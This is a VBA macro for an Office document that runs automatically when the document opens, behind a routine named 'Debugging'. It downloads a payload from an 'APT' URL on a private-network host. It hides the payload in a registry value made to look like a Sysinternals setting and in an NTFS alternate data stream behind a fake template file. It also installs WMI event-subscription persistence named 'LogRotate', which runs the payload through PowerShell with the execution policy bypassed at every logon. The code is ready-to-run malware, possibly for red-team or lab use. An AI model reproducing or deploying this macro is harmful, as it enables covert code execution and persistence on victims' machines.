Public Runs As Boolean

Sub Auto_Open()
    
    Call Debugging
    
End Sub
Sub AutoOpen()

    Call Debugging

End Sub
Sub Document_Open()

    Call Debugging

End Sub
Private Function WMIPersistence(ByVal exePath As String, ByVal taskName As String) As Boolean
    Dim filterName, consumerName As String
    Dim objLocator, objService1
    Dim objInstances1, objInstances2, objInstances3
    Dim newObj1, newObj2, newObj3
    
    On Error GoTo Failed
    
    filterName = taskName & " Event"
    consumerName = taskName & " Consumer"
    
    Set objLocator = CreateObject("WbemScripting.SWbemLocator")
    Set objService1 = objLocator.ConnectServer(".", "root\subscription")

    Set objInstances1 = objService1.Get("__EventFilter")

    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"

    Set newObj1 = objInstances1.Spawninstance_
    newObj1.Name = filterName
    newObj1.eventNamespace = "root\cimv2"
    newObj1.QueryLanguage = "WQL"
    newObj1.Query = Query
    newObj1.Put_
    
    Set objInstances2 = objService1.Get("CommandLineEventConsumer")
    Set newObj2 = objInstances2.Spawninstance_
    newObj2.Name = consumerName
    newObj2.CommandLineTemplate = exePath
    newObj2.Put_
    
    Set objInstances3 = objService1.Get("__FilterToConsumerBinding")
    Set newObj3 = objInstances3.Spawninstance_
    newObj3.Filter = "__EventFilter.Name=""" & filterName & """"
    newObj3.Consumer = "CommandLineEventConsumer.Name=""" & consumerName & """"
    newObj3.Put_
    
    WMIPersistence = True
    Exit Function
Failed:
    WMIPersistence = False

End Function
Private Function RegPayload(ByVal RegPath As String, ByVal RegValue As String) As Boolean
    
    Set wshShell = CreateObject("WScript.Shell")
    wshShell.regwrite RegPath, RegValue, "REG_SZ"
    
    On Error GoTo Failed
    RegPayload = True
    Exit Function
Failed:
    RegPayload = False
    
End Function
Private Function FilePayload(ByVal FilePath As String, ByVal FileName As String, ByVal ADSName As String, ByVal Payload As String)

    Dim fileSysObj
    Set fileSysObj = CreateObject("Scripting.FileSystemObject")
    Set fileObj = fileSysObj.CreateTextFile(FilePath & FileName & ":" & ADSName)
    fileObj.WriteLine Payload
    fileObj.Close

End Function
Private Function GetByte(needle)
    Dim haystack
    haystack = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

    GetByte = InStr(1, haystack, needle, vbBinaryCompare) - 1
    If GetByte = -1 Then
        Err.Raise 513, "DecodeBase64", "Invalid character in base64 string"
    End If
End Function

Private Function DeBase64(strData)
    Dim i, inCount, outCount, firstTime
    Dim inArray(0 To 3) As Integer
    Dim outArray() As Byte

    If Len(strData) Mod 4 <> 0 Then
        Err.Raise 514, "DecodeBase64", "Base64 string length is wrong length"
    End If

    firstTime = True
    While Len(strData) > 0
    
        inCount = 0
        For i = 1 To 4
            If Mid(strData, i, 1) <> "=" Then
                inArray(i - 1) = GetByte(Mid(strData, i, 1))
                inCount = inCount + 1
            Else
                Exit For
            End If
        Next

        If Len(strData) > 4 And inCount <> 4 Then
            Err.Raise 515, "DecodeBase64", "Base64 string has interal '='"
        End If

        If inCount < 2 Then
            Err.Raise 516, "DecodeBase64", "Base64 string has invalid ending"
        End If


        outCount = inCount - 1
        If firstTime Then
            ReDim outArray(outCount - 1)
            firstTime = False
        Else
            ReDim Preserve outArray(UBound(outArray) + outCount)
        End If

        outArray(UBound(outArray) + 1 - outCount) = (inArray(0) And &H3F) * 4 + (inArray(1) And &H30) / 16
        If outCount >= 2 Then
            outArray(UBound(outArray) + 2 - outCount) = (inArray(1) And &HF) * 16 + (inArray(2) And &H3C) / 4
        End If
        If outCount >= 3 Then
            outArray(UBound(outArray) + 3 - outCount) = (inArray(2) And &H3) * 64 + (inArray(3) And &H3F)
        End If

        strData = Mid(strData, 5)
    Wend
    DeBase64 = StrConv(outArray, vbUnicode)
End Function
Private Function HTTPClient(ByVal xUrl As String) As String
    
    Dim ie As Object
    Set ie = CreateObject("InternetExplorer.Application")
    ie.Navigate xUrl
    State = 0
    Do Until State = 4
    DoEvents: State = ie.readyState
    Loop
    On Error GoTo Failed
    HTTPClient = ie.Document.Body.getElementsByTagName("pre").Item(0).innerHTML
    Exit Function
Failed:
    HTTPClient = False

End Function
Private Function Debugging() As Boolean
    
    If Runs = True Then GoTo Failed
    
    Dim Str, CurrentUserSid, PayloadConsumer, xrUrl, xfUrl, xRegKey, xFilePath, xFileName, xADSName As String
    xrUrl = "http://10.0.0.155/APT/text.txt"
    xfUrl = "http://10.0.0.155/APT/text.txt"
    xFilePath = Environ("APPDATA") & "\Microsoft\Office\"
    xFileName = "NormalDocument.dotm"
    xADSName = "secret.txt"
    xRegKey = "HKLM\Software\Sysinternals\AutoRuns\EulaValue"
    
    PayloadConsumer = "powershell.exe -noP -ep bypass -C ""(gc '" & xFilePath & xFileName & ":" & xADSName _
    & "')"" | powershell.exe -nop -"
    
    Call RegPayload(xRegKey, HTTPClient(xfUrl))
    Call FilePayload(xFilePath, xFileName, xADSName, HTTPClient(xfUrl))
    Call WMIPersistence(PayloadConsumer, "LogRotate")
    
    On Error GoTo Failed
    Debugging = True
    Runs = True
    Exit Function
Failed:
    Debugging = False

End Function


